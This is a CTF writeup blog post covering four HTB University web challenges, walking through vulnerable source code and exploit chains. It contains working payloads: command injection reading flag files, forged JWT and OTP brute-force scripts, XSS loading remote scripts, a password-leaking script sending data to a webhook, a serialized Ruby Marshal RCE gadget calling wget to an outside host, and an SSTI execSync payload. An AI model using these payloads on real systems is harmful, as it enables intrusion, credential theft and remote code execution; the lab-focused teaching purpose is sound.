---
title: "HTB WU"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2024-08-27
draft: false
authors:
  - Hibwyli
---
# Write ups HTB UNIVERSITY

# Web armaxis
Logic is only thing
# Overview  : 
We are given a page and a email host to receive OTP.
![image](https://hackmd.io/_uploads/B1Z3cIYByg.png)
![image](https://hackmd.io/_uploads/BkQ69IYH1x.png)

Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.

```javascript
router.post("/reset-password", async (req, res) => {
  const { token, newPassword, email } = req.body; // Added 'email' parameter
  if (!token || !newPassword || !email)
    return res.status(400).send("Token, email, and new password are required.");

  try {
    const reset = await getPasswordReset(token);
    if (!reset) return res.status(400).send("Invalid or expired token.");

    const user = await getUserByEmail(email);
    if (!user) return res.status(404).send("User not found.");

    await updateUserPassword(user.id, newPassword);
    await deletePasswordReset(token);

    res.send("Password reset successful.");
  } catch (err) {
    console.error("Error resetting password:", err);
    res.status(500).send("Error resetting password.");
  }
});
```
- It doesnt check the email after all :v so we just get token sent to our email and submit with email of admin.
![image](https://hackmd.io/_uploads/Hkwv3UYr1x.png)
Then we get access !!!
# Admin
![image](https://hackmd.io/_uploads/SJOFnLtByl.png)
As an admin, we have more functions which is creating weapon and use MARKDOWN to note it.
Here is logic:
```javascript
function parseMarkdown(content) {
    if (!content) return '';
    return md.render(
        content.replace(/\!\[.*?\]\((.*?)\)/g, (match, url) => {
            try {
                const fileContent = execSync(`curl -s ${url}`);
                const base64Content = Buffer.from(fileContent).toString('base64');
                console.log("IMAGE")
                return `<img src="data:image/*;base64,${base64Content}" alt="Embedded Image">`;
            } catch (err) {
                console.error(`Error fetching image from URL ${url}:`, err.message);
                console.log("P TAG")
                return `<p>Error loading image: ${url}</p>`;
            }
        })
    );
}
```

- It puts our url into a execSync ? So vulnearble to command injection.And that regrex simply cannot stop us !
We can put something like : 
```
 $url = "; cat'/flag.txt'"
```
And our result will be base64 encoded , we just easily decode and get the result;
![image](https://hackmd.io/_uploads/Hk5lAItB1l.png)
And  get the result ![image](https://hackmd.io/_uploads/r1lzCIYHJg.png)
Decode and get flag  : 
![image](https://hackmd.io/_uploads/Bk_NR8Yrkl.png)

# Web Breaking Bank 
HTB challenge 
Knowledge :  JKU vulnerabilities
![image](https://hackmd.io/_uploads/SkvqZPYBkx.png)

# Goal 
- To get the flag , we need to login as finacial email and then dumps all money to get the flag :v 
```javascript
import { getBalancesForUser } from '../services/coinService.js';
import fs from 'fs/promises';

const FINANCIAL_CONTROLLER_EMAIL = "financial-controller@frontier-board.htb";

/**
 * Checks if the financial controller's CLCR wallet is drained
 * If drained, returns the flag.
 */
export const checkFinancialControllerDrained = async () => {
    const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL);
    const clcrBalance = balances.find((coin) => coin.symbol === 'CLCR');
    if (!clcrBalance || clcrBalance.availableBalance <= 0) {
        const flag = (await fs.readFile('/flag.txt', 'utf-8')).trim();
        return { drained: true, flag };
    }

    return { drained: false };
};

```
# OVERVIEW
- This challenge use JWT to check the email with an unexploitable secret key.
- But this uses RSA- 256 algorithms so we have this page:
![image](https://hackmd.io/_uploads/rJE5dDFr1l.png)

```javascript
export const createToken = async (payload) => {
    const privateKey = await getPrivateKey();
    return jwt.sign(payload, privateKey, {
        algorithm: 'RS256',
        header: {
            kid: KEY_ID,
            jku: JWKS_URI,
        },
    });
};
```
- It create jwt with a JKU !!
- JKU is a header to specify the position for jwt to extract the PUBLIC KEY to sign the data. But it is polluted with open redirect !!It blocks the open redirect.
```javascript
   if (!jku.startsWith('http://127.0.0.1:1337/')) {
            throw new Error('Invalid token: jku claim does not start with http://127.0.0.1:1337/');
        }

        if (!kid) {
            throw new Error('Invalid token: Missing header kid');
        }

        if (kid !== KEY_ID) {
            return new Error('Invalid token: kid does not match the expected key ID');
        }
```
But there is a  vulnerable route can help us. 
```javascript
  fastify.get('/redirect', async (req, reply) => {
        const { url, ref } = req.query;

        if (!url || !ref) {
            return reply.status(400).send({ error: 'Missing URL or ref parameter' });
        }
        // TODO: Should we restrict the URLs we redirect users to?
        try {
            await trackClick(ref, decodeURIComponent(url));
            reply.header('Location', decodeURIComponent(url)).status(302).send();
        } catch (error) {
            console.error('[Analytics] Error during redirect:', error.message);
            reply.status(500).send({ error: 'Failed to track analytics data.' });
        }
    });
```
It doesnt check the redirect so we can abuse this and perform an JKU redirect to our own PUBLIC key.
# Let's do it 
First create my own jwks.json. You can just use some tools to create it.
```json=
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "kid": "c709d578-666c-4683-84fb-f505652e6420",
            "n": "rGUZNQp2-rW1m4nlKqcFeAeWekWYreyqRsVb3keRnOPqZttlvpE5_gkQnmYMo0n0FHmgfeHHcFXNqXLpy2ZvfOr5EGRtk4sJXeLgTdHYukH3VrdGpIOyyTsOEFsCcHGamNGHUqdKRcEkVKdRzHkhjsEOMW6_APgS0ukqiKHBuiaspIQUiIS7xsna8x6Zh8R2COATOsSH2ae6PXBTaPzoaf13SdZvAvAfBBC7xJk6KQwdV99pazvJnh6c5GbIpVPle694cy8oDQ8gDtaOIOy4TTbT7aHB0eiSvpSGfEAqIXj8kWyiFNZHeCWTYm0_ly7Pn2JhNYkp25bv8nwXICoKpQ",
            "e": "AQAB"
        }
    ]
}
```
Then you use your own public key and private key to sign a new data (remember to change the kid==orignal kid)
![image](https://hackmd.io/_uploads/ByCr_DFHyl.png)


Here is the full script exploit : 
```python3= 
import requests

url = 'http://localhost:1337'
res = requests.post(url+'/api/auth/register',json={"email":"123@gmail.com","password":"123"})
token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImM3MDlkNTc4LTY2NmMtNDY4My04NGZiLWY1MDU2NTJlNjQyMCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3JlZj1oaWhpJnVybD1odHRwOi8vYW5ub3llZC1kZXNpZ24uc3VyZ2Uuc2gvandrcy5qc29uIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiIsImlhdCI6MTczNDUxODk3Mn0.V83p1kybpP1QLVG0oZvaXyygy-EABntI2c-c3s1-y6dTSZsMXOVZYh9CcGyi8hEnv4dlqxhsm8_CBc7_KsxYbzIauzOFAzfiEHQ6oDo889mDjbeBb-JB1zNOohrOFih27BUKhXtOakn89LnBoR6tIlhISHbjvJpCOmN8Uxb2v56WatmTQBut6GkeAQN9_u0hWeYsIxHPIhPfvg_S1BbXtROXiPy-0aCI67pzmr8sgB5GZRyF5lKpq5w9iQ6BfQC8fosNfsI_g60Nh-xtUyiDIOFyukbLggesTOVzgJQ5VPy853VqDkRj39rxeIH5nbztHwdQiw5RyFvQQCOkWCkqiA"
headers ={
    "Authorization":"Bearer "+ token
}
coins = requests.get(url+'/api/crypto/balance',headers=headers).json()[0]['availableBalance']
print(coins)
def generate_all_4_digit_combinations():
    combinations = []

    for i in range(10000):
        combinations.append(str(i).zfill(4))
    return combinations
// Easy bypass OTP here
all_combinations = generate_all_4_digit_combinations()
dataTransaction = {
    "to":"123@gmail.com",
    "amount":coins,
    "coin":'CLCR',
    "otp":''.join(all_combinations)
}

res = requests.post(url+'/api/crypto/transaction',json=dataTransaction,headers=headers)
res = requests.get(url+'/api/dashboard',headers=headers)
print(res.text)

```

FLAGGG
![image](https://hackmd.io/_uploads/SkYpdwFHkg.png)


# Conclusion 
 The source is too long , and consumes me so much time to find out :vvv 
 
 
 #  Contract Front End Write ups 
HTB challenge.
Knowlegde : 
+ Web cache deception 
+ ORM Leaks 
+ Xss with missing charset 
+ Insecure Deserialization in Marshal
A bunch of researches is pushed into this CTF :v 


# Overview  : 
![image](https://hackmd.io/_uploads/rkWFdrVSkx.png)
- We will have a flag stored at '/' and we need to find some ways to trigger a execution 
- We are given a big source code but we focus on somethings : 
* There are 3 privileges: guest, contract_manager, admin.
We will try to gain the admin privilege first. So let's go.
# Source code : 
Focus on how to get contract_manager first :v 
```python=
def get_contract_manager_password():
    try:
        contract_manager = User.objects.get(username="contract_manager")
        return contract_manager.password
    except User.DoesNotExist:
        raise ValueError("Contract Manager user does not exist in the database")

def startChromiumBot(url):
    print(url, file=sys.stdout)
    chrome_options = Options()
    chrome_options.binary_location = "/usr/bin/chromium-browser" 
    chrome_options.add_argument("--headless") 
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-software-rasterizer")
    
    chrome_service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=chrome_service, options=chrome_options)

    try:
        driver.get('http://127.0.0.1:1337/login')
        
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.ID, "loginBtn"))
        )
        
        username = "contract_manager"
        password = get_contract_manager_password()
        
        input1 = driver.find_element(By.XPATH, '/html/body/code/section/div/div/div/form/div[1]/input')
        input2 = driver.find_element(By.XPATH, '/html/body/code/section/div/div/div/form/div[2]/input')
        # Can i abuse this to get password        
        input1.send_keys(username)
        input2.send_keys(password)

        submit_button = driver.find_element(By.ID, "loginBtn")
        driver.execute_script("arguments[0].click();", submit_button)

        driver.get(url)
        time.sleep(30)
    finally:
        driver.quit()
```
->  This will create a contract_manager account and use it as a bot and then visit our website. We cannot really stole the cookie due to http only but if we can xss , we can call any command of a contract_manager which we wil talk later after finding xss.

# Finding XSS 
- So this is the first time I try xss in ruby so i search something and it seems something like  : 
```ruby=
    <%= @a.html_safe %>
```
- This will be vulnerable to xss if we control the @a so I try to find that gadget and there is something here: 
```ruby=
# app/helpers/application_helper.rb
module ApplicationHelper
  def render_markdown(text)
    return '' if text.nil? # Return an empty string if text is nil

    # Configure Redcarpet to render Markdown with links and images enabled
    renderer = Redcarpet::Render::HTML.new(filter_html: true)
    markdown = Redcarpet::Markdown.new(renderer, {
      no_intra_emphasis: true,
      autolink: true,
      tables: true,
      fenced_code_blocks: true,
      disable_indented_code_blocks: true,
      strikethrough: true,
      superscript: true
    })

    # Render Markdown to HTML
    markdown.render(text).html_safe
  end
end

 ```
 - Yeh , so we find a markdown xss vulnerabilities here. It is rendered in /settings template. Importantly, It will filter all HTML tag and just left the images and link.
So now add some javascript  link
```mardown=
[abc](javascript:alert'1')
```
![image](https://hackmd.io/_uploads/SkL5srES1g.png)
- Well we have xss but it seems a self xss and we cannot call anything like onerror automatically.
- But then you can find something interesting in the source code at 
```ruby=
# lib/remove_charset_middleware.rb
class RemoveCharsetMiddleware
    def initialize(app)
      @app = app
    end
  
    def call(env)
      status, headers, response = @app.call(env)
      headers["Content-Type"] = headers["Content-Type"].sub(/; charset=.*$/, '') if headers["Content-Type"]
      [status, headers, response]
    end
  end
  
```
![image](https://hackmd.io/_uploads/rJdU2BESye.png)
- You can see , there is no charset specified !!
Damnn, xss with missing charset comes into the play. Just try some \x1b$B and \x1b(B now bro.
![image](https://hackmd.io/_uploads/H1mBAHNBke.png)
Here we get ISO-2022-JS ~~ !!.
So this time to configure a payload to call an onerror. After a long time, it will be : 
```
bio:
![\x1B$@](abc)+\x1B(B+![abc](onerror=alert//)
```
![image](https://hackmd.io/_uploads/ByKoXINBJg.png)
--->> Now we have XSS !!!!


# How to this XSS trigger the contract_manager
- Another problem is how this xss can be visited by contract_manager ?
- It is depended on our session and render each own settings right ?  So how can it is possible . Now we come to a new technique called [Web Cache Depception](https://www.youtube.com/watch?v=70yyOMFylUA) , you can see this video for more understand.
```nginx=
 server {
        listen 1337;
        server_name _;
        # Proxy server forward to localhost:3000 and cache possible
        location ~ \.(css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json)$ {
            proxy_cache my_cache;
            proxy_cache_key "$uri$is_args$args";
            proxy_cache_valid 200 5m;
            proxy_cache_valid 404 1m;

            proxy_pass http://127.0.0.1:3000;

            proxy_set_header Host $http_host; # Pass original host and port
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

            proxy_http_version 1.1;
            add_header X-Cache-Status $upstream_cache_status;
        }

        location / {
            proxy_pass http://127.0.0.1:3000;

            proxy_set_header Host $http_host; # Pass original host and port
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

            proxy_http_version 1.1;
            add_header X-Cache-Status $upstream_cache_status;
        }
    }
```
This is configure to cache our data through a proxy server before forwarding to server. Let me simply explain how web cache works.
- First it will check the filename fetched extension before caching it, if the cache isn't storing any thing , forward the requests to server and get the response then store response cache. Any time after this , ANOTHER calls to the same resources, it will check from cache first and receive data from cache. But we call poison the cache with OUR XSS PAYLOAD !!!.
- We can find some bypass based on difference of parsing delemiter between nginx and and ruby. (delimiter in ruby is ".")

So if we call a request like  "/settings.ico" this will matches with "/settings" in ruby !! But it will be cached in proxy cache server !!
We can test it with simple call a GET requests to /settings.ico

Before caching : 
![image](https://hackmd.io/_uploads/Hkj4IIEHke.png)
Successfully caching : 
![image](https://hackmd.io/_uploads/Sk4IL8EB1g.png)
- Now everyone gets into settings.ico will be poisonous with our xss !! And as well as the CONTRACT_MANAGER

# Gain access as a contract_manager partly
- We had XSS but we cannot stole the cookies like I said before. But we can also call every routes of a contract_manager !!  So let's login as a contract_manager with our Docker for a faster investigate.
![image](https://hackmd.io/_uploads/r1kLPLEHkl.png)
AS a contact_manager, we have only new Features  is FILTERING 
```
http://localhost:1337/contracts/manage?title__contains=&status=&start_date=&end_date=
```
So let's read the source to find some vulnerabilites
```python=
class FilteredContractsView(APIView):
    permission_classes = [IsAuthenticated, IsContractManagerOrAdmin]

    def post(self, request, format=None):
        try:
            if request.data.get("all") == True:
                contracts = Contract.objects.all()
            else:
                filtered_data = {key: value for key, value in request.data.items() if key != "all"}
                contracts = Contract.objects.filter(**filtered_data)
                
            serializer = ContractSerializer(contracts, many=True)
        except Exception as e:
            return Response({"error": str(e)}, status=status.HTTP_400_BAD_REQUEST)
            
        return Response(serializer.data, status=status.HTTP_200_OK)
```
- This app handles SQL with a django ORM. 
- When apply a filter function the syntax for example : 
```python=
products = Product.objects.filter(name='Laptop')
```
But there is something leaked with 
```python=
  filtered_data = {key: value for key, value in request.data.items() if key != "all"}
  contracts = Contract.objects.filter(**filtered_data)
```
We can handle our choice to select !!!  You can read more here to better understand https://www.elttam.com/blog/plormbing-your-django-orm/
- Now we need to find what we can leak here by reading it's relationship establishment.
```python=
  owner = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        on_delete=models.CASCADE,
        related_name='contracts',
        help_text="User who owns the contract"
    )
```
In the Contract model , it has a field owner who owns the contracts !! And we can leak the username password with owner__password__startswith= "randomCharHere" like boolean search.
Here is exploit : 
```javascript
chars = "abcdefghijklmnopqrstuvwxyz"
adminPassword  =""
webhook = "https://webhook.site/307dd0c2-4733-4e45-954a-009ff8242f3a?a="
function leak(adminPassword) {
    if(adminPassword.length == 32)  {
        fetch(webhook+adminPassword)
    }
    for (let char of chars) {
        fetch(url+adminPassword+char)
            .then(data=>data.text())
            .then((data)=>{
                if(!data.includes("No contracts found based on the current filter.")){
                    adminPassword+=char
                    console.log(adminPassword)
                    leak(adminPassword)
                }
            })

}
}

leak(adminPassword)
```

Now we test this script on Dev tools 
![image](https://hackmd.io/_uploads/H1Z8xPVSyx.png)
And receive admin password at webhook : 
![image](https://hackmd.io/_uploads/rJ6IlD4ryl.png)

- Now combine this with our xss before to create a malicous script src !!
Then report it and receive admin pasword !!
![image](https://hackmd.io/_uploads/SynhYwVHye.png)
```
bio : 
![\x1B$@](abc)+\x1B(B+![abc](onerror=s=document.createElement('script');s.src='http://garrulous-protest.surge.sh/payload.js';document.body.appendChild(s);//)
```
- We successfully leak the admin password so let's login in
# ADMIN PRIVILEGE
![image](https://hackmd.io/_uploads/SJc35PNHJl.png)
As admin we have the new feature is CONTRACT TEMPLATES.

```ruby=
# Contract template controllers
 def create
    user_data = current_user
    
    unless user_data && user_data['id']
      flash[:alert] = "User must be logged in to create a template."
      redirect_to login_path and return
    end
    serialized_content = Marshal.dump(params[:content])
  
    response = HTTP.auth("Token #{session[:token]}").post("http://localhost:8080/api/contract_templates/", json: { data: serialized_content, user_id: user_data['id'] }.merge(params.to_unsafe_h))
  
    if response.status.success?
      flash[:notice] = "Template created successfully."
      redirect_to contract_templates_path
    else
      flash.now[:alert] = "Failed to create template."
      render :new
    end
  end
  

  def show
    response = HTTP.auth("Token #{session[:token]}").get("http://localhost:8080/api/contract_templates/#{params[:id]}/")

    if response.status.success?
      @template = response.parse
      
      content = Marshal.load(@template['data']) if @template['data']

      @template['id'] ||= params[:id]
      @template['name'] ||= 'Unnamed Template'
      @template['description'] ||= 'No description provided.'
      @template['data'] = content
      @template['created_at'] ||= Time.current.to_s
    else
      redirect_to contract_templates_path, alert: "Template not found."
    end
  endk
```
- When creating a content , it will serialize our data but it seems can be changed with our params cause using **merge**  function??
-  Is the ruby is vulnerable to Insecure Serialization ?
- Well doing some reasearch, and the answer is yesss !!! So here is the key to execute code to read file flag.

# The hard things 
- Well so the main idea of Insecure Deserialization is find some gadget to call require to some sink function. This is really hard to find it in a CTF challenge, but it is lucky that there are many researcher find this for us. We can use this right now and I will spend sometime to research it latter . :v  
- And here is the POC for that  . https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb
- Apply this we get the payload  : 
```python=
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

username = "admin"
password = ADMIN_PASSWORD

base_url = "http://127.0.0.1:1337"

session = requests.Session()

def getAuthenToken(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find("input", {"name": "authenticity_token"})["value"]

    login_page = session.get(f"{base_url}/login")
    login_page.raise_for_status()

    authenticity_token = getAuthenToken(login_page.text)

    login_payload = {
        "username": username,
        "password": password,
        "authenticity_token": authenticity_token
    }

    ## LOGIN AS ADMIN
    response = session.post(f"{base_url}/login", data=login_payload)
    response.raise_for_status()
## GET RCE 
    content_data = "04085b07631547656d3a3a5370656346657463686572553a1147656d3a3a56657273696f6e5b066f3a1e47656d3a3a526571756573745365743a3a4c6f636b66696c650a3a09407365746f3a1447656d3a3a52657175657374536574063a1540736f727465645f72657175657374735b076f3a2547656d3a3a5265736f6c7665723a3a5370656353706563696669636174696f6e063a0a40737065636f3a2447656d3a3a5265736f6c7665723a3a47697453706563696669636174696f6e073a0c40736f75726
    3656f3a1547656d3a3a536f757263653a3a4769740a3a09406769744922087a6970063a0645543a0f407265666572656e63654922102f6574632f706173737764063b10543a0e40726f6f745f6469724922092f746d70063b10543a10407265706f7369746f7279492208616e79063b10543a0a406e616d65492208616e79063b10543b0b6f3a2147656d3a3a5265736f6c7665723a3a53706563696669636174696f6e073b14492208616e79063b10543a1240646570656e64656e636965735b006f3b0a063b0b6f3b0c073b0d6f3b0e0a3b0f4922087a6970063b10543b114922652d546d54543d222428776765742068747470733a2f2f776562686f6f6b2e736974652f33303764643063322d343733332d346534352d393534612d3030396666383234326633613f613d60636174202f666c61672e747874602922612e7a6970063b10543b124922092f746d70063b10543b13492208616e79063b10543b14492208616e79063b10543b0b6f3b15073b14492208616e79063b10543b165b003b165b003a134067656d5f646570735f66696c6549220a2f726f6f74063b10543a124067656d5f646570735f6469724922062f063b10543a0f40706c6174666f726d735b00"
    byte_data = bytes.fromhex(content_data)
    contracts_page = session.get(f"{base_url}/contract_templates/new")
    contracts_page.raise_for_status()

    authenticity_token = getAuthenToken(contracts_page.text)

    contracts_payload = {
        "authenticity_token": authenticity_token,
        "name": "test",
        "description": "test",
        "content": "test",
        "commit": "Create Template",
        "data":byte_data
    }

    response = session.post(f"{base_url}/contract_templates", data=contracts_payload)

```
And the flag !!
![image](https://hackmd.io/_uploads/BJTkDrrrkg.png)

# Conclusion 
- This is a big chain of vulnerabilities and modern attacks skills. I cannot solve this by myself but the write ups helps me alot.
- I still need to read about the research of ORM leaks, Marshal latter when I have free time :Vvv


# Web - Intergalactic Bounty
 Hard challenge from HTB University
 Knowledge: Email disparency, Prototype pollution, Needle
 
 # Overview 
 ![image](https://hackmd.io/_uploads/ByIVNHtBJl.png)
-  Firstly, we have an login page where we must register with an account and our given email is test@email.htb
-  ![image](https://hackmd.io/_uploads/SJLLNHKr1x.png)
Here is the logic for register. It seems just accept the domain interstellar.htb.
```javascript
const registerAPI = async (req, res) => {
  const { email, password, role = "guest" } = req.body;
  const emailDomain = emailAddresses.parseOneAddress(email)?.domain;

  if (!emailDomain || emailDomain !== 'interstellar.htb') {
    return res.status(200).json({ message: 'Registration is not allowed for this email domain' });
  }

  try {
    await User.createUser(email, password, role);
    return res.json({ message: "User registered. Verification email sent.", status: 201 });
  } catch (err) {
    return res.status(500).json({ message: err.message, status: 500 });
  }
};

```
- Specially it uses email-address library to parse the email . 
```javascript
const emailAddresses = require('email-addresses');
```
- We can read this from the manual page of email-address
- ![image](https://hackmd.io/_uploads/ryNlBSYB1e.png)
- It supports the RFC 5322 and gives us an interesting email format:
"BOB example"\<bop@example.com> ? This looks really weird at first sight. With the text in "" is a name of domain.
Read more , we will see that the server again use other library to send email which is NodeMailer

```javascript
const transporter = nodemailer.createTransport({
  host: "127.0.0.1",
  port: 1025,
  secure: false,
});

const sendVerificationEmail = async (email, code) => {
  const mailOptions = {
    from: "no-reply@interstellar.htb",
    to: email,
    subject: "Email Verification",
    html: `Your verification code is: ${code}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log(`Verification email sent to ${email}`);
  } catch (error) {
    console.error("Error sending email:", error);
    throw new Error("Unable to send verification email");
  }
};

```
- Then i try this payload and it works.((I will explain later))
```javascript
email :' "test@email.htb" @interstellar.htb'
```
But this wont work ( JUST A SPACE )
```javascript
email :' "test@email.htb"@interstellar.htb'
```
This abuse the differences in ways of 2 library parses out our address !!! This will trickyly send to our email kkk !!!
- Moreover, in logic requests it seems something vulnerable when setting the default value without actually block it ! We can get admin privilege from this !
```javascript
  const { email, password, role = "guest" } = req.body;
```
Now we try this : 
Register with role admin : 
![image](https://hackmd.io/_uploads/SyfoLrKB1x.png)
Login with opt code received from email page:
![image](https://hackmd.io/_uploads/r1RhIStSyx.png)

# Now we are admins !!!
- Let find out what we can do now . We have just some thing interesting !
```javascriptj
const transmitAPI = async (req, res) => {
  const { url } = req.body;

  if (!url) {
    return res.status(400).json({ message: "URL is required" });
  }

  const responseBody = await fetchURL(url);

  res.status(200).json({
    message: "Request successful",
    responseBody,
  });
};

const editBountiesAPI = async (req, res) => {
  const { ...bountyData } = req.body;
  try {
    const data = await BountyModel.findByPk(req.params.id, {
      attributes: [
        "target_name",
        "target_aliases",
        "target_species",
        "last_known_location",
        "galaxy",
        "star_system",
        "planet",
        "coordinates",
        "reward_credits",
        "reward_items",
        "issuer_name",
        "issuer_faction",
        "risk_level",
        "required_equipment",
        "posted_at",
        "status",
        "image",
        "description",
        "crimes",
        "id",
      ],
    });

    if (!data) {
      return res.status(404).json({ message: "Bounty not found" });
    }

    const updated = mergedeep(data.toJSON(), bountyData);

    await data.update(updated);

    return res.json(updated);
  } catch (err) {
    console.log(err);
    return res.status(500).json({ message: "Error fetching data" });
  }
};
```
 We will have 2 main controllers : 
 + Transmit API will make a requests to our given url with ***needle*** library ? It looks really weird and maybe some hints of this ctf.
 + EditBountyApis will merge our data with an object ?? Damn, its really clear that here is an Prototype Pollution attack and we need to find some gadgets and maybe it will be exist in the **needle**.
 ```javascript
 const fetchURL = async (url) => {
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    throw new Error("Invalid URL: URL must start with http or https");
  }

  const options = {
    compressed: true,
    follow_max: 0,
  };

  return new Promise((resolve, reject) => {
    needle.get(url, options, (err, resp, body) => {
      if (err) {
        return reject(new Error("Error fetching the URL: " + err.message));
      }
      resolve(body);
    });
  });
};
 ```
The needle will call get with url , options ,and a callbacks. After reading the needle library, it seems interesting here.
![image](https://hackmd.io/_uploads/B1ImuBYH1x.png)
We can use the attribute output to write a any file !!!! So combine this with the prototype pollution we can achive  this easily with  : 
```index
  "__proto__":{
     "output":"/app/views/index.html" 
  }
  // Write into template files to receive easily
```
Lets polluted the options : 
![image](https://hackmd.io/_uploads/HJIMFSFrJl.png)

Now whatever we receive from the calling transmit API will be stored in /app/views/index.html which we can see it !!!Just host a simple page with the payload :

```index
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /flag.txt')")()}}
```

Finally, send this through our url .
![image](https://hackmd.io/_uploads/Hko6FHtBJe.png)
We overwrite this !!! Now lets check the index.html
![image](https://hackmd.io/_uploads/HkPk5HYrJx.png)
Ehh ?? It looks unupdated :vv
![image](https://hackmd.io/_uploads/r1BMcSKryx.png)
But in docker it get changed !!
Maybe we need to triger and update in our app
In the config : 
```superiv=
[program:node]
directory=/app
command=node index.js
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```
Our app is allowed to restart, so we need to trigger this. We need to make a crash or execption.
```javascript
const transmitAPI = async (req, res) => {
  const { url } = req.body;

  if (!url) {
    return res.status(400).json({ message: "URL is required" });
  }

  const responseBody = await fetchURL(url);

  res.status(200).json({
    message: "Request successful",
    responseBody,
  });
};
```
We can abuse this because it doesnt catch any exception. Just send random URL 
ANd get the FLAGGGGGGG
![image](https://hackmd.io/_uploads/S1F-jHtrkx.png)
-  Thats the end of challenge :v 

# Research about NodeMailer behaviours 
- Now I will explain why our email works. 
```
 email =  "test@email.htb" @interstellar.htb
```
- I read the source code of nodemailer to figure out this. You could try too at [here](https://github.com/nodemailer/nodemailer).
    - I wont refer to the way of express-addresses work because it just follow the RFC 5322 and our email will be parsed with domain "@interstellar.htb" as expected. So I just focus on the nodemailer

## Main steps 
-  First the command will tokenize our address with following code: 
```javascript
class Tokenizer {
    constructor(str) {
        this.str = (str || '').toString();
        this.operatorCurrent = '';
        this.operatorExpecting = '';
        this.node = null;
        this.escaped = false;

        this.list = [];
        /**
         * Operator tokens and which tokens are expected to end the sequence
         */
        this.operators = {
            '"': '"',
            '(': ')',
            '<': '>',
            ',': '',
            ':': ';',
            // Semicolons are not a legal delimiter per the RFC2822 grammar other
            // than for terminating a group, but they are also not valid for any
            // other use in this context.  Given that some mail clients have
            // historically allowed the semicolon as a delimiter equivalent to the
            // comma in their UI, it makes sense to treat them the same as a comma
            // when used outside of a group.
            ';': ''
        };
    }

    /**
     * Tokenizes the original input string
     *
     * @return {Array} An array of operator|text tokens
     */
    tokenize() {
        let list = [];

        for (let i = 0, len = this.str.length; i < len; i++) {
            let chr = this.str.charAt(i);
            let nextChr = i < len - 1 ? this.str.charAt(i + 1) : null;
            this.checkChar(chr, nextChr);
        }

        this.list.forEach(node => {
            node.value = (node.value || '').toString().trim();
            if (node.value) {
                list.push(node);
            }
        });

        return list;
    }

    /**
     * Checks if a character is an operator or text and acts accordingly
     *
     * @param {String} chr Character from the address field
     */
    checkChar(chr, nextChr) {
        if (this.escaped) {
            // ignore next condition blocks
        } else if (chr === this.operatorExpecting) {
            this.node = {
                type: 'operator',
                value: chr
            };

            if (nextChr && ![' ', '\t', '\r', '\n', ',', ';'].includes(nextChr)) {
                this.node.noBreak = true;
            }

            this.list.push(this.node);
            this.node = null;
            this.operatorExpecting = '';
            this.escaped = false;

            return;
        } else if (!this.operatorExpecting && chr in this.operators) {
            this.node = {
                type: 'operator',
                value: chr
            };
            this.list.push(this.node);
            this.node = null;
            this.operatorExpecting = this.operators[chr];
            this.escaped = false;
            return;
        } else if (['"', "'"].includes(this.operatorExpecting) && chr === '\\') {
            this.escaped = true;
            return;
        }

        if (!this.node) {
            this.node = {
                type: 'text',
                value: ''
            };
            this.list.push(this.node);
        }

        if (chr === '\n') {
            // Convert newlines to spaces. Carriage return is ignored as \r and \n usually
            // go together anyway and there already is a WS for \n. Lone \r means something is fishy.
            chr = ' ';
        }

        if (chr.charCodeAt(0) >= 0x21 || [' ', '\t'].includes(chr)) {
            // skip command bytes
            this.node.value += chr;
        }

        this.escaped = false;
    }
}
```
- It splits our data into an token array :  
![image](https://hackmd.io/_uploads/rkclg8tSkx.png)
It will split the " as a operator and our text is just text :v. Then put this token through _handleAddress function.
The logic is really simple and comment makes it readable.
```javascript
function _handleAddress(tokens) {
    let isGroup = false;
    let state = 'text';
    let address;
    let addresses = [];
    let data = {
        address: [],
        comment: [],
        group: [],
        text: []
    };
    let i;
    let len;

    // Filter out <addresses>, (comments) and regular text
    for (i = 0, len = tokens.length; i < len; i++) {
        let token = tokens[i];
        let prevToken = i ? tokens[i - 1] : null;
        if (token.type === 'operator') {
            switch (token.value) {
                case '<':
                    state = 'address';
                    break;
                case '(':
                    state = 'comment';
                    break;
                case ':':
                    state = 'group';
                    isGroup = true;
                    break;
                default:
                    state = 'text';
                    break;
            }
        } else if (token.value) {
            if (state === 'address') {
                // handle use case where unquoted name includes a "<"
                // Apple Mail truncates everything between an unexpected < and an address
                // and so will we
                token.value = token.value.replace(/^[^<]*<\s*/, '');
            }

            if (prevToken && prevToken.noBreak && data[state].length) {
                // join values
                data[state][data[state].length - 1] += token.value;
            } else {
                data[state].push(token.value);
            }
        }
    }

    // If there is no text but a comment, replace the two
    if (!data.text.length && data.comment.length) {
        data.text = data.comment;
        data.comment = [];
    }

    if (isGroup) {
        // http://tools.ietf.org/html/rfc2822#appendix-A.1.3
        data.text = data.text.join(' ');
        addresses.push({
            name: data.text || (address && address.name),
            group: data.group.length ? addressparser(data.group.join(',')) : []
        });
    } else {
